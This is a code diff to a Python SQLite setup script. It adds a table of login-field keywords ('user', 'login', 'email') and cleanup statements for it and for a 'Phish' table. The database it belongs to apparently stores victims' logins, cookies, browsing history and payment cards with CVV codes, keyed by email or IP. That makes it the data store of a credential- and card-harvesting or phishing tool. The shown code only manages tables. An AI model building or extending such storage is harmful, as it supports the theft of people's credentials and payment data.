@@ -32,6 +32,12 @@ def create_all_tables():
     );"""
     c.execute(q)
 
+    ### Login Key Table ###
+    q = """CREATE TABLE IF NOT EXISTS LoginKW (
+        KeyWord VARCHAR(255)
+    );"""
+    c.execute(q)
+
     #### Creat Cookies Table ####
     q = """CREATE TABLE IF NOT EXISTS Cookies (
     EmailIP VARCHAR(255),
@@ -89,12 +95,31 @@ def create_all_tables():
         CVV CHAR(3),
         FOREIGN KEY (EmailIP) REFERENCES Users(EmailIP)
     );"""
+
     c.execute(q)
 
     conn.commit()
     conn.close()
 
     print("All tables have been created")
+
+def insert_default_values():
+    conn = sqlite3.connect("data.db")
+    c = conn.cursor()
+
+    q = "INSERT INTO LoginKW VALUES ('user')"
+    c.execute(q)
+
+    q = "INSERT INTO LoginKW VALUES ('login')"
+    c.execute(q)
+
+    q = "INSERT INTO LoginKW VALUES ('email')"
+    c.execute(q)
+
+    conn.commit()
+    conn.close()
+
+    print("Default values added")
 
 def drop_all_tables():
     conn = sqlite3.connect("data.db")
@@ -109,12 +134,18 @@ def drop_all_tables():
     q = "DROP TABLE IF EXISTS Login"
     c.execute(q)
 
+    q = "DROP TABLE IF EXISTS LoginKW"
+    c.execute(q)
+
     q = "DROP TABLE IF EXISTS History"
     c.execute(q)
 
     q = "DROP TABLE IF EXISTS Cookies"
     c.execute(q)
 
+    q = "DROP TABLE IF EXISTS Phish"
+    c.execute(q)
+    
     q = "DROP TABLE IF EXISTS Card"
     c.execute(q)
 
@@ -142,10 +173,16 @@ def delete_db():
     q = "DELETE FROM Login"
     c.execute(q)
 
+    q = "DELETE FROM LoginKW"
+    c.execute(q)
+
     q = "DELETE FROM History"
     c.execute(q)
 
     q = "DELETE FROM Cookies"
+    c.execute(q)
+
+    q = "DELETE FROM Phish"
     c.execute(q)
 
     q = "DELETE FROM Card"
